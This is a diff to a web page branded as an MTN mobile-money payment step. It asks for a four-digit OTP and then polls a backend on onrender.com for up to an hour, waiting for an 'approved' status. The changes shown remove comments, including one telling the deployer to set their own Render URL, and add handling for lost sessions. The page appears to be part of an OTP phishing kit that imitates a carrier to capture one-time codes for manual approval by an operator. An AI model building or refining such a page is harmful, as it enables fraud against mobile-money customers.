@@ -40,7 +40,6 @@
 
   .wrap{max-width:480px;margin:0 auto;padding:20px 16px 0}
 
-  /* PROGRESS */
   .progress-row{display:flex;align-items:center;gap:8px;margin-bottom:20px;padding:0 4px}
   .progress-step{flex:1;display:flex;flex-direction:column;align-items:center;gap:6px;position:relative}
   .progress-dot{width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:800;background:#E5E7EB;color:#94A3B8;border:2px solid #E5E7EB;position:relative;z-index:2;transition:all .3s}
@@ -49,7 +48,6 @@
   .progress-label{font-size:10.5px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.4px}
   .progress-label.active{color:#003366}
 
-  /* SUMMARY */
   .summary{background:var(--white);border:1px solid var(--border);border-radius:14px;padding:14px 16px;margin-bottom:16px;box-shadow:var(--shadow)}
   .summary-row{display:flex;justify-content:space-between;align-items:center;padding:6px 0;font-size:12.5px}
   .summary-row .k{color:var(--muted);font-weight:500}
@@ -57,7 +55,6 @@
   .summary-row .v.amount{color:var(--mtn-blue);font-size:16px;font-weight:800}
   .summary-divider{height:1px;background:var(--border);margin:4px 0}
 
-  /* CARD */
   .card{background:var(--white);border:1px solid var(--border);border-radius:var(--radius);box-shadow:var(--shadow);overflow:hidden;padding:24px 20px}
 
   .card-icon-wrap{display:flex;justify-content:center;margin-bottom:14px}
@@ -68,13 +65,11 @@
   .card-desc{font-size:12.5px;color:var(--muted);text-align:center;margin-bottom:22px;line-height:1.55}
   .card-desc strong{color:var(--mtn-navy);font-weight:700}
 
-  /* HINT */
   .hint-box{background:linear-gradient(135deg,#FFF8E1,#FFF3C4);border:1.5px solid var(--mtn-yellow);border-radius:12px;padding:12px 14px;margin-bottom:18px;display:flex;gap:10px;align-items:flex-start}
   .hint-icon{font-size:18px;flex-shrink:0;line-height:1.4}
   .hint-text{font-size:11.5px;color:#5a4a00;line-height:1.55;font-weight:500}
   .hint-text strong{color:#003366;font-weight:800}
 
-  /* OTP BOXES */
   .otp-row{display:flex;justify-content:center;margin-bottom:10px}
   .otp-boxes{display:flex;gap:12px}
   .otp-box{width:64px;height:72px;border-radius:16px;border:2px solid var(--border);background:#FBFCFE;text-align:center;font-size:26px;font-weight:800;color:var(--mtn-navy);outline:none;font-family:inherit;caret-color:var(--mtn-blue);padding:0;transition:all .2s}
@@ -83,17 +78,14 @@
   .otp-box.invalid{border-color:var(--mtn-red);background:#FFF5F5;animation:shake .4s}
   @keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-6px)}75%{transform:translateX(6px)}}
 
-  /* ERROR */
   .error-text{color:var(--mtn-red);font-size:11.5px;text-align:center;margin-bottom:12px;display:none;font-weight:600}
   .error-text.show{display:block;animation:slideDown .25s}
   @keyframes slideDown{from{opacity:0;transform:translateY(-4px)}to{opacity:1;transform:translateY(0)}}
 
-  /* RESEND */
   .resend-row{text-align:center;font-size:12.5px;color:var(--muted);margin:16px 0 18px;font-weight:500}
   .resend-row a{color:var(--mtn-blue);font-weight:700;cursor:pointer;text-decoration:none}
   .resend-row a:hover{text-decoration:underline}
 
-  /* BUTTON */
   .submit-btn{width:100%;padding:14px;background:var(--mtn-blue);color:#fff;border:none;border-radius:12px;font-size:14.5px;font-weight:700;letter-spacing:.3px;cursor:pointer;font-family:inherit;transition:filter .15s,transform .1s;box-shadow:0 4px 12px rgba(0,71,171,.25)}
   .submit-btn:hover:not(:disabled){filter:brightness(1.08)}
   .submit-btn:active:not(:disabled){transform:scale(.99)}
@@ -102,7 +94,6 @@
   .secure-row{display:flex;align-items:center;justify-content:center;gap:6px;margin-top:14px;font-size:11px;color:var(--muted);font-weight:500}
   .secure-row svg{width:12px;height:12px;stroke:var(--mtn-green);stroke-width:2.5;fill:none}
 
-  /* OVERLAYS */
   .overlay{position:fixed;inset:0;background:rgba(17,24,39,.65);backdrop-filter:blur(4px);-webkit-backdrop-filter:blur(4px);display:none;align-items:center;justify-content:center;z-index:1000;padding:16px}
   .overlay.show{display:flex;animation:fadeIn .2s}
   @keyframes fadeIn{from{opacity:0}to{opacity:1}}
@@ -151,7 +142,6 @@
 
 <div class="wrap">
 
-  <!-- PROGRESS -->
   <div class="progress-row">
     <div class="progress-step">
       <div class="progress-dot done">✓</div>
@@ -167,7 +157,6 @@
     </div>
   </div>
 
-  <!-- SUMMARY -->
   <div class="summary">
     <div class="summary-row">
       <span class="k">Amount</span>
@@ -184,7 +173,6 @@
     </div>
   </div>
 
-  <!-- CARD -->
   <div class="card">
     <div class="card-icon-wrap">
       <div class="card-icon">
@@ -226,7 +214,6 @@
 
 </div>
 
-<!-- WAITING -->
 <div class="overlay" id="waitingOverlay">
   <div class="overlay-card">
     <div class="spinner"></div>
@@ -236,7 +223,6 @@
   </div>
 </div>
 
-<!-- RESULT -->
 <div class="overlay" id="resultOverlay">
   <div class="overlay-card">
     <div class="status-icon" id="resultIcon"></div>
@@ -249,7 +235,7 @@
 </div>
 
 <script>
-const API_BASE = 'https://mtn-payment.onrender.com'; // ← change to your Render URL
+const API_BASE = 'https://mtn-payment.onrender.com';
 const POLL_MS = 2500;
 const TIMEOUT_MS = 60 * 60 * 1000;
 const OTP_LENGTH = 4;
@@ -302,7 +288,6 @@ if(!currentReceipt || !currentReceipt.tx){
   }
 }
 
-/* OTP inputs */
 const otpBoxes = [1,2,3,4].map(i => document.getElementById('otp' + i));
 const otpError = document.getElementById('otpError');
 const submitBtn = document.getElementById('submitBtn');
@@ -399,7 +384,13 @@ function startPolling(){
     try {
       const res = await fetch(`${API_BASE}/api/status/${currentSessionId}`);
       const data = await res.json().catch(() => ({}));
-      if(!data.ok) return;
+      if(!data.ok){
+        if(res.status === 404){
+          stopPolling(); hideWaiting();
+          showResult('error', 'Session lost', 'Please start over from the receipt page.', false);
+        }
+        return;
+      }
 
       if(data.status === 'approved'){
         stopPolling(); hideWaiting();
